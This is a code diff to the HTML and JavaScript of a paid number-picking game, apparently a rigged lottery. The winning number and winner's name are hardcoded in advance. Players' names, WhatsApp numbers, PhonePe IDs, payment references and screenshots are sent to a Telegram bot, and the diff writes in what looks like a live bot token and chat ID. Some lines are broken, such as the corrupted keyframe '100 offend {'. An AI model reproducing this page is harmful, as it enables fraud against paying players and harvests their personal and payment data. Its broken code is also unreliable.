@@ -40,10 +40,15 @@
     }
 
     .winner-name-box {
-      font-size: 18px;
+      font-size: 24px;
       margin-top: 10px;
-      font-weight: normal;
-      color: white;
+      font-weight: bold;
+      color: #00ffcc;
+      text-shadow: 0 0 10px #00ffcc;
+      background: rgba(0, 0, 0, 0.5);
+      padding: 10px;
+      border-radius: 10px;
+      text-align: center;
     }
 
     .timer-box {
@@ -56,12 +61,22 @@
       border-radius: 10px;
     }
 
+    .current-time-box {
+      text-align: center;
+      margin-top: 10px;
+      font-size: 18px;
+      color: white;
+      background-color: rgba(0, 0, 0, 0.5);
+      padding: 8px;
+      border-radius: 10px;
+    }
+
     @keyframes blink {
       0% {
         text-shadow: 0 0 10px #ff006e, 0 0 20px #ff006e, 0 0 30px #ff006e;
         opacity: 1;
       }
-      100% {
+      100 offend {
         text-shadow: 0 0 20px #ff006e, 0 0 30px #ff006e, 0 0 40px #ff006e;
         opacity: 0.5;
       }
@@ -84,6 +99,12 @@
       border: none;
       border-radius: 5px;
       cursor: pointer;
+    }
+
+    .number-btn:disabled {
+      background: #ccc;
+      color: #666;
+      cursor: not-allowed;
     }
 
     #buyForm {
@@ -205,7 +226,8 @@
 
   <div class="winner-name-box" id="winnerName" style="display:none"></div>
 
-  <div class="timer-box" id="timer">🕒 Time Left: 00:02:00</div>
+  <div class="timer-box" id="timer">🕒 Open Time: 09:21:00 AM</div>
+  <div class="current-time-box" id="currentTime">🕒 Current Time: --:--:-- --</div>
 
   <div class="number-container">
     <button class="number-btn" onclick="selectNumber('05')">05</button>
@@ -257,8 +279,8 @@
 
   <script src="https://cdn.jsdelivr.net/npm/tesseract.js@2.1.5/dist/tesseract.min.js"></script>
   <script>
-    const telegramToken = "YOUR_TELEGRAM_BOT_TOKEN";
-    const telegramChatId = "YOUR_TELEGRAM_CHAT_ID";
+    const telegramToken = "7930171564:AAEbqIoIGZY22cP4GxreLAWhQxD08rQOtrQ";
+    const telegramChatId = "5247395156";
 
     const winningNumberValue = "27";
     const winnerNameValue = "Alice";
@@ -266,27 +288,88 @@
     document.getElementById("winningNumber").textContent = "";
     document.getElementById("winnerName").style.display = "none";
 
-    let timeInSeconds = 120; // Initialize timer to 2 minutes
-    function updateTimer() {
-      const timerDisplay = document.getElementById("timer");
-      const minutes = String(Math.floor(timeInSeconds / 60)).padStart(2, '0');
-      const seconds = String(timeInSeconds % 60).padStart(2, '0');
-      timerDisplay.textContent = `🕒 Time Left: ${minutes}:${seconds}`;
+    // Set Open Time (manually fixed)
+    const openTime = "09:21:00 AM";
 
-      if (timeInSeconds === 0) {
-        clearInterval(timerInterval);
-        document.getElementById("winningNumber").textContent = winningNumberValue;
-        document.getElementById("winnerName").textContent = `🏆 Winner: ${winnerNameValue}`;
-        document.getElementById("winnerName").style.display = "block";
-        showAllLists(); // Show all lists when timer ends
-      } else {
-        timeInSeconds--;
+    function formatISTTime() {
+      const now = new Date();
+      const istOffset = 5.5 * 60 * 60 * 1000; // IST: UTC +5:30
+      const istTime = new Date(now.getTime() + istOffset);
+      
+      let hours = istTime.getUTCHours();
+      const minutes = String(istTime.getUTCMinutes()).padStart(2, '0');
+      const seconds = String(istTime.getUTCSeconds()).padStart(2, '0');
+      const ampm = hours >= 12 ? 'PM' : 'AM';
+      
+      hours = hours % 12;
+      hours = hours ? hours : 12;
+      hours = String(hours).padStart(2, '0');
+      
+      return `${hours}:${minutes}:${seconds} ${ampm}`;
+    }
+
+    function parseTimeToSeconds(timeStr) {
+      const [time, period] = timeStr.split(' ');
+      let [hours, minutes, seconds] = time.split(':').map(Number);
+      
+      if (period === 'PM' && hours !== 12) hours += 12;
+      if (period === 'AM' && hours === 12) hours = 0;
+      
+      return hours * 3600 + minutes * 60 + seconds;
+    }
+
+    let isWinnerDisplayed = false;
+
+    function updateTimer() {
+      if (isWinnerDisplayed) return;
+
+      // Update Open Time display
+      const timerDisplay = document.getElementById("timer");
+      timerDisplay.textContent = `🕒 Open Time: ${openTime}`;
+
+      // Update Current Time
+      const currentTimeDisplay = document.getElementById("currentTime");
+      const currentTime = formatISTTime();
+      currentTimeDisplay.textContent = `🕒 Current Time: ${currentTime}`;
+
+      // Check if current time matches or exceeds open time
+      const currentSeconds = parseTimeToSeconds(currentTime);
+      const openSeconds = parseTimeToSeconds(openTime);
+
+      if (currentSeconds >= openSeconds) {
+        isWinnerDisplayed = true;
+        
+        // Display winning number and winner name
+        const winningNumberBox = document.querySelector(".winning-number-box");
+        const winningNumberElement = document.getElementById("winningNumber");
+        const winnerNameElement = document.getElementById("winnerName");
+
+        winningNumberElement.textContent = winningNumberValue;
+        winnerNameElement.textContent = `🏆 Winner: ${winnerNameValue}`;
+        winnerNameElement.style.display = "block";
+
+        // Keep the blinking animation, change border and shadow to green
+        winningNumberBox.style.boxShadow = "0 0 20px 5px #00ffcc, 0 0 30px 5px #00ffcc";
+        winningNumberBox.style.borderColor = "#00ffcc";
+
+        // Disable number selection buttons
+        document.querySelectorAll(".number-btn").forEach(button => {
+          button.disabled = true;
+        });
+
+        console.log("Winner displayed:", winningNumberValue, winnerNameValue);
       }
     }
 
+    // Run timer every second
     const timerInterval = setInterval(updateTimer, 1000);
+    updateTimer();
 
     function selectNumber(num) {
+      if (isWinnerDisplayed) {
+        alert("The game has ended. No more selections allowed.");
+        return;
+      }
       document.getElementById('selectedNumber').textContent = num;
       document.getElementById('buyForm').style.display = 'block';
       document.querySelector('.number-container').style.display = 'none';
@@ -300,11 +383,6 @@
     function toggleList(id) {
       const list = document.getElementById(id);
       list.style.display = list.style.display === 'none' ? 'block' : 'none';
-    }
-
-    function showAllLists() {
-      document.getElementById("buyersList").style.display = "block";
-      document.getElementById("winnersList").style.display = "block";
     }
 
     function extractUTRFromImage() {
@@ -346,27 +424,44 @@
       reader.readAsDataURL(file);
     }
 
-    function submitForm() {
+    async function submitForm() {
       const whatsapp = document.getElementById('whatsappInput').value;
-      const name = document.getElementById('nameInput').value;
+       name = document.getElementById('nameInput').value;
       const phonepe = document.getElementById('phonepeInput').value;
       const utr = document.getElementById('utrInput').value;
       const selected = document.getElementById('selectedNumber').textContent;
+      const imageInput = document.getElementById('imageUpload');
+      const file = imageInput.files[0];
 
-      if (!whatsapp || !name || !phonepe || !utr || !selected) {
-        alert("Please fill all fields.");
+      if (!whatsapp || !name || !phonepe || !utr || !selected || !file) {
+        alert("Please fill all fields and upload an image.");
         return;
       }
 
       const message = `📝 New Form Submission:\n👤 Name: ${name}\n📱 WhatsApp: ${whatsapp}\n💸 PhonePe: ${phonepe}\n🎯 Selected Number: ${selected}\n🔢 UTR: ${utr}`;
 
-      fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: telegramChatId, text: message })
-      });
+      try {
+        // Prepare FormData for sending the image
+        const formData = new FormData();
+        formData.append('chat_id', telegramChatId);
+        formData.append('photo', file);
+        formData.append('caption', message);
 
-      alert("Form submitted!");
+        // Send the image with caption
+        const photoResponse = await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+
+        if (!photoResponse.ok) {
+          throw new Error('Failed to send photo');
+        }
+
+        alert("Form and image submitted successfully!");
+      } catch (err) {
+        console.error(err);
+        alert("Error submitting form or image. Please try again.");
+      }
     }
   </script>
 </body>
